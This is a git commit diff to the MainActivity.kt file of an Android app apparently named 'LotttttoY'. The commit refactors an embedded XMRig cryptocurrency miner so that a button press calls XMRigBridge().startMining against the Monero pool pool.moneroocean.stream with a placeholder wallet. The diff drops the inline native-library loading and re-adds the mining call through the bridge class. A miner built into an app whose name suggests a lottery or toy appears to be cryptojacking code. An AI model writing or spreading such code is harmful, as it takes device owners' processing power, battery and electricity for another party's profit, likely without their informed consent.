a4a2a75fe57a437aa73ab60bb316fe1cb68d6096
Andrei Bourdine <bourdine@gmail.com>
2026-03-16 13:46:07 +0300

    Update MainActivity.kt

--- app/src/main/java/com/lottttoy/MainActivity.kt
+++ app/src/main/java/com/lottttoy/MainActivity.kt
@@ -1,25 +1,17 @@
-package com.lottttoy
+package com.yourcompany.LotttttoY
 
 import android.os.Bundle
 import android.widget.Button
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
-    external fun startMining(poolUrl: String, wallet: String)
-
-    companion object {
-        init {
-            System.loadLibrary("xmrig")
-        }
-    }
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         val button = findViewById<Button>(R.id.button)
         button.setOnClickListener {
-            startMining("pool.moneroocean.stream:3333", "YOUR_WALLET_ADDRESS_HERE")
+            XMRigBridge().startMining("pool.moneroocean.stream:3333", "YOUR_WALLET_ADDRESS_HERE")
         }
     }
 }
